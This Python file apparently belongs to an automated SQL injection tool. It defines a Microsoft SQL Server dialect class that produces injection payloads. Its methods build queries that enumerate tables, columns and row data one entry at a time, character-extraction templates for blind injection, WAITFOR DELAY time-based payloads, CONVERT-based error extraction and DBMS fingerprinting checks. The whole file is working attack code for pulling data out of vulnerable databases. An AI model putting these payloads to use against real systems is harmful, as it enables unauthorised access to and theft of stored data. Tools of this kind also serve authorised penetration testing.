"""MSSQL 方言"""
from dbms.base import BaseDialect


class MSSQLDialect(BaseDialect):
    name = "mssql"

    def version_expr(self): return "@@VERSION"
    def database_expr(self): return "DB_NAME()"
    def current_user_expr(self): return "SYSTEM_USER"
    def is_dba_expr(self): return "IS_SRVROLEMEMBER('sysadmin')"

    def tables_query(self, db_name, idx):
        return (f"SELECT TOP 1 name FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) rn "
                f"FROM sys.tables) t WHERE rn={idx+1}")

    def columns_query(self, table_name, db_name, idx):
        return (f"SELECT TOP 1 name FROM (SELECT c.name, ROW_NUMBER() OVER (ORDER BY c.column_id) rn "
                f"FROM sys.columns c WHERE c.object_id=OBJECT_ID('{table_name}')) t WHERE rn={idx+1}")

    def column_types_query(self, table_name, db_name, idx):
        return (f"SELECT TOP 1 ty.name FROM (SELECT t.name ty, ROW_NUMBER() OVER (ORDER BY c.column_id) rn "
                f"FROM sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id "
                f"WHERE c.object_id=OBJECT_ID('{table_name}')) x WHERE rn={idx+1}")

    def data_query(self, table_name, column, idx):
        return (f"SELECT TOP 1 {column} FROM (SELECT {column}, ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) rn "
                f"FROM {table_name}) t WHERE rn={idx+1}")

    def substr_templates(self):
        return ["SUBSTRING(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["UNICODE(({sql}))", "ASCII(({sql}))"]

    def length_templates(self):
        return ["LEN(({sql}))", "DATALENGTH(({sql}))"]

    def concat_templates(self):
        return ["(({a})+({b})+({c}))", "CONCAT({a},{b},{c})"]

    def hex_to_str(self, hexstr):
        # 0x.. 是 varbinary，CONVERT 成 varchar 即还原为原文本
        return f"CONVERT(VARCHAR(MAX), 0x{hexstr})"

    def sleep_expr(self, seconds):
        return f"WAITFOR DELAY '0:0:{seconds}'"

    def sleep_expr_variants(self, seconds):
        return [
            f"WAITFOR DELAY '0:0:{seconds}'",
            f"WAITFOR TIME '23:59:5{min(seconds,9)}'",
        ]

    def error_payloads(self, inner):
        return [
            f"CONVERT(INT,({inner}))",
            f"CONVERT(INT,CONCAT(0x7e,{inner},0x7e))",
            f"(SELECT {inner} WHERE 1=CONVERT(INT,(SELECT TOP 1 {inner})))",
        ]

    def error_fingerprints(self):
        return ["CONVERT(INT,(SELECT @@VERSION))"]

    def error_keywords(self):
        return ["Microsoft OLE DB", "SQL Server", "Unclosed quotation"]

    def boolean_fingerprints(self):
        # 只留本 DBMS 独有的判据（sysobjects）；原来那条 `1=1` 在任何库上都成立，不具区分度。
        return ["(SELECT COUNT(*) FROM sysobjects)>0"]